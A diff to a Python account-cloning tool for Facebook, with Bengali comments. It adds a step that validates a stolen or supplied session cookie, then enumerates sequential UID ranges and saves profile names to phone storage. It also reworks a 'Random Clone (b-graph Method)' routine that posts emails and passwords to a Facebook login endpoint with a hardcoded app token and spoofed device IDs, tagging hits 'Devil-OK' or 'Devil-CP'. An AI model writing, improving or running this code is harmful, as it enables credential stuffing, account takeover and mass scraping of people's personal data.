@@ -42,7 +42,7 @@ print("====================================")
 choice = input("[★] 1/2/3/4/5/6 : ")
 
 # -------------------------------------------------------------
-# METHOD 1: FB UID COLLECTOR (FIXED & UPDATED)
+# METHOD 1: FB UID COLLECTOR (WITH COOKIE CHECKER)
 # -------------------------------------------------------------
 if choice in ["1", "১"]:
     os.system('clear')
@@ -50,7 +50,7 @@ if choice in ["1", "১"]:
     print("        ★ FILE CREATE MENU ★        ")
     print("====================================")
     
-    # 1. Ask for Free or Paid option first
+    # Free/Paid Option Selection
     print("[1] Continue as Free User (2 Hours Limit)")
     print("[2] Activate Paid Version (Unlimited)")
     user_choice = input("[+] Select option: ")
@@ -66,7 +66,7 @@ if choice in ["1", "১"]:
     else:
         user_status = "free"
 
-    # 2. Check Cookie status or prompt for new one
+    # Fetching or Inputting Cookie
     fb_cookie = None
     if user_status == "paid":
         if saved_cookie and user_status == "paid":
@@ -84,15 +84,48 @@ if choice in ["1", "১"]:
                 print("[!] Your 2-hour free session has expired!")
             fb_cookie = input("[+] Enter Your FB Cookie: ")
 
-    # Save Configuration
-    try:
-        with open(CONFIG_FILE, "w") as f:
-            f.write(f"{fb_cookie}\n{time.time()}\n{user_status}\n")
-    except:
-        pass
-
+    # COOKIE VALIDATION SYSTEM (এখানে নতুন লজিকটি যুক্ত করা হয়েছে)
     if fb_cookie:
-        # 3. Series selection option as requested (1/2/3 Mix)
+        session = requests.Session()
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+            'Cookie': fb_cookie
+        }
+        
+        print("\n[+] Verifying cookie status with Facebook server...")
+        cookie_is_valid = False
+        
+        try:
+            # মবাসিক প্রোফাইল চেক করে ভ্যালিডেশন করা
+            check_response = session.get("https://mbasic.facebook.com/profile.php", headers=headers, timeout=10)
+            if check_response.status_code == 200:
+                soup = BeautifulSoup(check_response.text, 'html.parser')
+                page_title = soup.find('title')
+                title_text = page_title.text.strip() if page_title else ""
+                
+                if "Log In" in title_text or "লগ ইন" in title_text or "Content Not Found" in check_response.text:
+                    print("\n\033[1;31m[X] Expired Cookie! Please use a fresh cookie.\033[0m")
+                    fb_cookie = None # কুকি বাতিল করা হলো
+                else:
+                    print("\n\033[1;32m[✓] Cookie Login Successful!\033[0m")
+                    cookie_is_valid = True
+            else:
+                print(f"\n\033[1;31m[X] Server returned error code: {check_response.status_code}\033[0m")
+                fb_cookie = None
+        except:
+            print("\n\033[1;31m[X] Network Error! Unable to connect to verification server.\033[0m")
+            fb_cookie = None
+
+    # Save configuration if the cookie is verified successfully
+    if fb_cookie and cookie_is_valid:
+        try:
+            with open(CONFIG_FILE, "w") as f:
+                f.write(f"{fb_cookie}\n{time.time()}\n{user_status}\n")
+        except:
+            pass
+
+    # Proceed only if cookie is valid
+    if fb_cookie and cookie_is_valid:
         print("\n====================================")
         print("[1] 10000 Series (Old UID)")
         print("[2] 6158 Series (Running/New UID)")
@@ -105,64 +138,44 @@ if choice in ["1", "১"]:
         elif series_choice == "2":
             base_uid = "6158"
         else:
-            base_uid = input("[+] Enter Custom Base UID (e.g., 1000271676): ")
+            base_uid = input("[+] Enter Custom Base UID (e.g., 1000): ")
 
         series_start = int(input("[+] Select Series Start (e.g., 10001): "))
         series_end = int(input("[+] Select Series End (e.g., 99999): "))
         
-        output_file = input("[+] Enter Output File Name (e.g., result.txt): ")
-        if not output_file.endswith('.txt'):
-            output_file += '.txt'
-            
-        # 4. Storage Path Fix for Android (/sdcard/)
-        output_path = os.path.join("/sdcard", output_file)
+        user_file_input = input("[+] Enter Output File Name (e.g., /sdcard/result.txt): ")
         
-        # Test if /sdcard/ is writeable, otherwise fallback to local file
-        try:
-            with open(output_path, "a") as test_file:
-                pass
-        except PermissionError:
-            print("[!] Storage Permission Denied! Saving to current directory instead.")
-            output_path = output_file
+        if user_file_input.startswith("/sdcard"):
+            output_path = user_file_input
+        else:
+            output_path = os.path.join("/sdcard", user_file_input)
 
-        session = requests.Session()
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36', 
-            'Cookie': fb_cookie
-        }
-        
         print("\n[+] Connecting to server...")
         print("[+] Extracting data... (Press CTRL+C to Stop/Cancel)\n")
         
-        # Infinite Loop or Loop through series until user cancels (CTRL+C)
         try:
             for uid_suffix in range(series_start, series_end + 1):
                 full_uid = str(base_uid) + str(uid_suffix)
                 url = "https://mbasic.facebook.com/profile.php?id=" + str(full_uid)
                 
                 try:
-                    response = session.get(url, headers=headers)
+                    response = session.get(url, headers=headers, timeout=10)
                     if response.status_code == 200:
                         soup = BeautifulSoup(response.text, 'html.parser')
                         page_title = soup.find('title')
-                        if page_title:
-                            profile_name = page_title.text.strip()
-                        else:
-                            profile_name = "Unknown User"
-                            
+                        profile_name = page_title.text.strip() if page_title else "Unknown User"
+                        
                         if "Log In" in profile_name or "Error" in profile_name or "Content Not Found" in profile_name:
                             print("[INVALID] UID: " + str(full_uid) + " (Cookie Dead)")
                             break
                         elif "add_friend" in response.text or "Add Friend" in response.text or "নম্বর" in response.text or "বন্ধু" in response.text:
-                            # Premium style output layout matching your screenshot
                             print(f"\033[1;32mPremium\033[0m - Successfully Extracted From : \033[1;35m{full_uid}\033[0m")
                             
-                            # Save to phone storage path
                             with open(output_path, "a", encoding="utf-8") as file_out:
                                 file_out.write(str(full_uid) + " | " + str(profile_name) + "\n")
                         else:
                             print("[SKIPPED] UID: " + str(full_uid) + " (Follower Account)")
-                    time.sleep(1.5)
+                    time.sleep(1.0)
                 except KeyboardInterrupt:
                     print("\n[-] Extraction Stopped By User.")
                     break
@@ -173,7 +186,7 @@ if choice in ["1", "১"]:
             
         print(f"\n[✓] Data Saved Successfully at: {output_path}")
     else:
-        print("[X] Cookie Error!")
+        print("[X] Verification Failed. Process Stopped.")
 
 # -------------------------------------------------------------
 # METHOD 2: REEL SERVER CHECK
@@ -203,50 +216,25 @@ if choice in ["3", "4", "৩", "৪", "8", "৮"]:
 # -------------------------------------------------------------
 if choice in ["5", "৫"]:
     os.system('clear')
-    
-    import requests
-import uuid
-import json
-
-def b_graph_method(uid, password):
+    print("--- [5] Random Clone (b-graph Method) ---")
+    uid = input("[+] Enter UID/Email: ")
+    password = input("[+] Enter Password: ")
+    print("\n[+] Checking account details...")
     r = requests.Session()
-    
-    head = {
-        'Host': 'b-graph.facebook.com',
-        'X-Fb-Connection-Type': 'WIFI',
-        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', # সাধারণত একটি ডিফল্ট টোকেন লাগে
-        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002) [FBAN/MessengerLite;FBAV/275.0.0.12.119;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/273616641;]'
-    }
-    
-    data = {
-        'adid': str(uuid.uuid4()),
-        'format': 'json',
-        'device_id': str(uuid.uuid4()),
-        'email': uid,
-        'password': password,
-        'generate_analytics_claim': '1',
-        'credentials_type': 'password',
-        'source': 'login',
-        'error_detail_type': 'button_with_disabled',
-        'enroll_ext_attrib': '0',
-        'generate_session_cookies': '1',
-        'generate_machine_id': '1',
-        'meta_inf_fbmeta': '',
-    }
-    
+    head = {'Host': 'b-graph.facebook.com', 'X-Fb-Connection-Type': 'WIFI', 'Authorization': 'OAuth 350685531728|62f8ce9f74744849a044318023157f12', 'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020)'}
+    data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': uid, 'password': password, 'generate_analytics_claim': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_ext_attrib': '0', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': ''}
     try:
-        pos = r.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
-        
+        pos = r.post('https://b-graph.facebook.com/auth/login', headers=head, data=data).json()
         if 'session_key' in pos or 'access_token' in pos:
-            print(f"\n[Devil-OK] {uid} | {password}")
-        elif 'www.facebook.com' in pos.get('error', {}).get('message', ''):
-            print(f"\n[Devil-CP] {uid} | {password}")
+            print("\n[Devil-OK] " + str(uid) + " | " + str(password))
+        elif 'www.facebook.com' in str(pos):
+            print("\n[Devil-CP] " + str(uid) + " | " + str(password))
         else:
-            pass
+            print("\n[X] Login Failed / Incorrect Details")
     except:
         print("\n[X] Network Error!")
-       
-        # -------------------------------------------------------------
+
+# -------------------------------------------------------------
 # METHOD 6: EXIT
 # -------------------------------------------------------------
 if choice in ["6", "৬"]:
